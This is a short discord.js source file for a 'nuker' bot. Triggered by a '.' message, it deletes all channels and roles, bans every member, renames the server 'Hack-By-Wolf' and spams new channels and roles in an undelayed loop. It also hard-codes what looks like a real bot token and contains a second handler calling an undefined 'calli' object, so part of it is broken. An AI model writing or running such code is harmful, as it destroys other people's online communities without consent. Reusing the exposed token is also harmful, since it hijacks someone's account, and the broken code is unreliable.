const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Hack-By-Wolf");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("Hack-By-Wolf", "text");///////bo channel 
        message.guild.createChannel("Hack-By-Wolf", "voice");////bo voice
        message.guild.createRole({ name: "Hack-By-Wolf" });////nawek dane bo role kan
      });
    }
  }
});

//////////////
calli.on("ready", () => {
  console.log(`${calli.user.tag}`);
  calli.user.setActivity(`Loading...`, {
    Type: "Playing"
  });
});

client.login("ODY4ODY2MDYxOTU5ODM1Njk5.YP14kw.XXoKLdd_Yx5_FK0-lKYCrEnt8Bw")
